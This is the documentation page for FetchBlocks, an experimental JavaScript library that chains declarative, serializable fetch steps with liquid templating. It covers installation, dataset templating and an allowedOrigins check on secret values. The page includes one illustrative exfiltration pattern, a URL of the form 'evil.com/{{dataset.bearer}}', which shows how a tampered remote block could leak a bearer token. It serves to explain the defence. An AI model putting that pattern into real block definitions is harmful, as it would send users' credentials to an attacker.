---
sidebar_position: 1
slug: /
---

# FetchBlocks

An experimental system using a declarative syntax based on the [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) to quickly move data around.

They are meant to be "webby" - safe and linkable.

**But** this repo is just describing an early concept along with an alpha implementation. So there are rough edges, and the API is subject to change.

## Getting the code

FetchBlocks is meant to run in any modern JavaScript environment that supports ESM, Fetch, and WASM. There's a bundle provided for older environments that polyfills some APIs and adds commonjs support.

### Browser

```html
<script type="module">
  import { fetchblock } from "https://esm.sh/@bgrins/fetchblocks/web/mod.js";
</script>
```

### Node

```js
let { fetchblock } = require("@bgrins/fetchblocks");
```

```js
import { fetchblock } from "@bgrins/fetchblocks";
```

### Deno

```js
import { fetchblock } from "https://deno.land/x/fetchblocks/mod.js";
```

## Your first few fetchblocks

### Basic

The fetchblock is a JS array of "steps" which can be serialized / deserialized. This constraint is important for later, but in practice you'd call this from the host JS environment like so:

```js
let block = new fetchblock([
  { resource: "https://x-colors.herokuapp.com/api/hex2rgb?value=FFFFFF" },
]);
let response = await block.run(); // Object { hex: "#FFFFFF", rgb: "rgb(255, 255, 255)" }
```

The options in the first step reflect onto the Fetch API, so head over to [MDN](https://developer.mozilla.org/en-US/docs/Web/API/fetch) to see the full options. But a more complex call could look like this:

```js
let block = new fetchblock([
  {
    resource:
      "https://api.notion.com/v1/databases/{{dataset.databaseid}}/query",
    method: "POST",
    headers: {
      "Notion-Version": "2022-02-22",
      Authorization: "Bearer {{dataset.bearer}}",
    },
  },
]);
```

### With dataset

You'll see in the example above `{{dataset.bearer}}`. When you call `block.run` you can pass in some options, one of them is a special object called `dataset` (name borrowed from [HTMLElement.dataset](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset)). And string value in the block is passed through a [liquid template](https://shopify.github.io/liquid/) to flatten those values into the strings. Here's an example:

```js
let block = new fetchblock([
  {
    resource:
      "https://x-colors.herokuapp.com/api/hex2rgb?value={{dataset.hex}}",
  },
]);
let response = await block.run({
  dataset: {
    hex: "000000",
  },
}); // {"hex":"#000000","rgb":"rgb(0, 0, 0)"}
```

Now the caller can pass in a different value. Why is this useful? Because the blocks can also be hosted remotely or reused. For example:

```js
let block = fetchblocks.loadFromURI(
  "https://gist.githubusercontent.com/bgrins/fc9cf06de8b0118bd18e4c3d08cd092b/raw/f3d4fb66655cc2e669a1c83679953b9f3b39e2ca/test.json"
);
let response = await block.run({
  dataset: {
    hex: "ff00ff",
  },
}); // {"hex":"#FF00FF","rgb":"rgb(255, 0, 255)"}
```

You may worry about seeing `dataset.bearer` above, combined with linked blocks. What if the upstream block changed the URL from `"https://api.notion.com/v1/databases/{{dataset.databaseid}}/query"` to `"evil.com/{{dataset.bearer}}"`? There's a way to protect from this, inspired by [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). If you pass the dataset key as an object with `allowedOrigins` then the fetchblock will throw before attempting to make a request if the domain doesn't match. For example, this will work:

```js
let block = new fetchblock([
  {
    resource:
      "https://api.notion.com/v1/databases/{{dataset.databaseid}}/query",
    method: "POST",
    headers: {
      "Notion-Version": "2022-02-22",
      Authorization: "Bearer {{dataset.bearer}}",
    },
  },
]);
let response = await block.run({
  dataset: {
    bearer: {
      value: "secret",
      allowedOrigins: ["https://api.notion.com"],
    }
  },
});
```

But this will throw:

```js
let response = await block.run({
  dataset: {
    bearer: {
      value: "secret",
// highlight-start
      allowedOrigins: ["https://api.slack.com"],
// highlight-end
    }
  },
}); // throws TODO get message here
```

### Linking blocks

Todo

## Adding steps

So far what's been shown could be easily done with a call to `fetch`. Fetchblocks expect the first step will be either an external resource, or a link to another block. The subsequent steps are called "transforms". Each takes in the value from the previous step, does some kind of transformation, and passes it to the next one.

TODO - implement this: These run in a WASM-based JavaScript interpreter which doesn't have access to the outside world. So the environment is very constrained (i.e. it can't access the network, DOM, native APIs, etc). It basically can do object manipulation and math.

Because the steps are declarative, we can create a plan before running anything and know exactly what it is meant to do.
```
